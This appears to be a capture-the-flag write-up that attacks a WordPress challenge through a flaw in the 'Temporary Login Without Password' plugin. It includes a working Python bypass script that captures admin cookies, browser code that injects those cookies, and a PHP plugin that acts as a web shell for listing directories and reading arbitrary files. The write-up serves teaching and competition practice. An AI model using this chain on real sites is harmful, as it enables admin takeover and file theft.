# WordPress Bug Bounty Hunter — Writeup

| | |
|:---|:---|
| **Challenge Author** | siunam |
| **Writeup Author** | Yeung Wang Sang |
| **Category** | Web / Broken Access Control / RCE |
| **Status** | ✅ Solved |

---

## Overview

An exploit chain against a WordPress instance running a vulnerable version of the **Temporary Login Without Password** plugin. Three stages, escalating in impact:

```
[Unauthenticated]
      |
      | 1. Authentication Bypass (sanitize_key quirk)
      v
[Admin Session]
      |
      | 2. Session Hijack via cookie injection
      v
[wp-admin Dashboard]
      |
      | 3. RCE via malicious plugin upload
      v
[Flag read from filesystem]
```

### Core Vulnerabilities

| Vulnerability | Description |
|:---|:---|
| **Broken Authentication** | Plugin fails to validate tokens — WordPress's `sanitize_key()` returns `''` for certain inputs, bypassing token matching |
| **RCE via Plugin Upload** | Admin users can upload and activate arbitrary PHP plugins |

---

## Environment

The flag was hidden in the WordPress container filesystem under a randomized filename:

| Environment | Path |
|:---|:---|
| Local (Docker) | `/var/www/html/flag_bd3889508b255c762a772327190c098f.txt` |
| Remote | `/var/www/html/flag_3c054d6ce9d1fd5a9c1e42901c878ce2.txt` |

---

## Step 1 — Authentication Bypass

The **Temporary Login Without Password** plugin verified tokens using WordPress's `sanitize_key()` function. The flaw: `sanitize_key()` returns an empty string `''` when given special characters or arrays. If the stored token is also empty, the comparison passes — granting admin access.

We wrote a Python script to test three payloads that each trigger this behaviour:

```python
import requests

def exploit(target_url):
    print(f"[*] Targeting: {target_url}")

    # Each payload makes sanitize_key() return '' to bypass token matching
    payloads = [
        # Special character — stripped to empty by sanitize_key
        {"temp-login-token": "!", "temp-login-action": "revoke"},

        # Space character — also stripped to empty
        {"temp-login-token": " ", "temp-login-action": "info"},

        # Array input — sanitize_key returns '' for non-string types
        {"temp-login-token[]": "1", "temp-login-action": "anything"}
    ]

    for index, params in enumerate(payloads):
        print(f"\n[*] Sending Payload {index + 1}...")
        session = requests.Session()

        try:
            response = session.get(target_url, params=params, allow_redirects=False, timeout=5)
            location = response.headers.get('Location', '')

            if response.status_code in [301, 302] and 'wp-admin' in location:
                print("[+] Exploit successful! Token verification bypassed.")
                print(f"[+] Redirected to: {location}")
                print("[+] Administrator session cookies captured:")
                for cookie in session.cookies:
                    print(f"    -> {cookie.name} = {cookie.value}")
                return
            else:
                print("[-] Payload did not trigger login. Status:", response.status_code)

        except requests.exceptions.RequestException as e:
            print(f"[-] Request error: {e}")

if __name__ == "__main__":
    exploit("http://chal.polyuctf.com:42271/")
```

**Example output:**

```
[+] Exploit successful! Token verification bypassed.
[+] Redirected to: http://chal.polyuctf.com:42271/wp-admin
[+] Administrator session cookies captured:
    -> wordpress_f7cfbaeb012cab244ea07d7e26d820c2 = temp-login-O9WBOZUvHKnma7H%7C1773748416%7C...
    -> wordpress_logged_in_f7cfbaeb012cab244ea07d7e26d820c2 = temp-login-O9WBOZUvHKnma7H%7C1773748416%7C...
```

---

## Step 2 — Session Hijacking

With admin cookies in hand, we inject them into the browser:

1. Open an **Incognito** window and go to `http://chal.polyuctf.com:42271/`
2. Open **DevTools → Console** (`F12`) and run:

```javascript
(function() {
  const domain = '.chal.polyuctf.com';
  const path = '/';

  document.cookie = `wordpress_logged_in_f7cfbaeb012cab244ea07d7e26d820c2=temp-login-O9WBOZUvHKnma7H%7C1773748416%7CfkhCCiQzQhLr6aUs5Ul7fPEbmGoyPcdWMpESIXbEyCn%7Cea9f1e4a17b44bcd51dad86a1cd94ab8af93a73b87ea19c32d6699d51b653ee4; path=${path}; domain=${domain}`;

  document.cookie = `wordpress_f7cfbaeb012cab244ea07d7e26d820c2=temp-login-O9WBOZUvHKnma7H%7C1773748416%7CfkhCCiQzQhLr6aUs5Ul7fPEbmGoyPcdWMpESIXbEyCn%7Cea9f1e4a17b44bcd51dad86a1cd94ab8af93a73b87ea19c32d6699d51b653ee4; path=${path}; domain=${domain}`;

  console.log('Cookies injected. Refresh the page.');
})();
```

3. **Refresh the page** — full access to `/wp-admin` is now granted.

---

## Step 3 — Bypassing the Theme Editor

Editing `functions.php` or `404.php` directly via **Appearance → Theme Editor** was blocked by WordPress's built-in PHP linter, which validates syntax before saving.

> **Bypass:** The **Plugin Upload** path skips this linter entirely. We create and upload a custom plugin instead.

---

## Step 4 — RCE via Malicious Plugin Upload

We crafted a minimal PHP plugin (`flag-reader.php`) exposing three capabilities through GET parameters:

```php
<?php
/*
Plugin Name: Flag Reader Pro
Description: Reconnaissance tool for CTF flag hunting.
Version: 1.1
*/

add_action('init', function() {
    // List environment variables
    if (isset($_GET['env'])) {
        echo "<h1>Environment:</h1><pre>";
        print_r(getenv());
        die("</pre>");
    }

    // List directory contents
    if (isset($_GET['ls'])) {
        $dir = isset($_GET['path']) ? $_GET['path'] : '/';
        echo "<h1>Contents of " . htmlspecialchars($dir) . ":</h1><pre>";
        if (is_dir($dir)) {
            foreach (scandir($dir) as $file) echo $file . "\n";
        } else {
            echo "Directory not found or not accessible.";
        }
        die("</pre>");
    }

    // Read a file
    if (isset($_GET['read'])) {
        $file = $_GET['read'];
        echo "<h1>Reading: " . htmlspecialchars($file) . "</h1><pre>";
        echo (file_exists($file) && is_readable($file))
            ? htmlspecialchars(file_get_contents($file))
            : "File not found or permission denied.";
        die("</pre>");
    }
});
```

**Deployment steps:**

```bash
# 1. Package the plugin
zip flag-reader.zip flag-reader.php
```

```
# 2. Upload via WordPress dashboard:
#    Plugins > Add New > Upload Plugin > Choose File > Install Now > Activate
```

**Enumerate the filesystem** to locate the flag file:

```
http://chal.polyuctf.com:42271/?ls=1&path=/var/www/html
```

Found: `flag_ea610e455132349a1f63015aafd843e9.txt`

**Read the flag:**

```
http://chal.polyuctf.com:42271/?read=/var/www/html/flag_ea610e455132349a1f63015aafd843e9.txt
```

---

## Flag

```
PUCTF26{WordPress_bug_bounty_hunting_can_be_super_interesting_OcrXuXtXCK5smWRU8SKgugS1b2DGR5id}
```
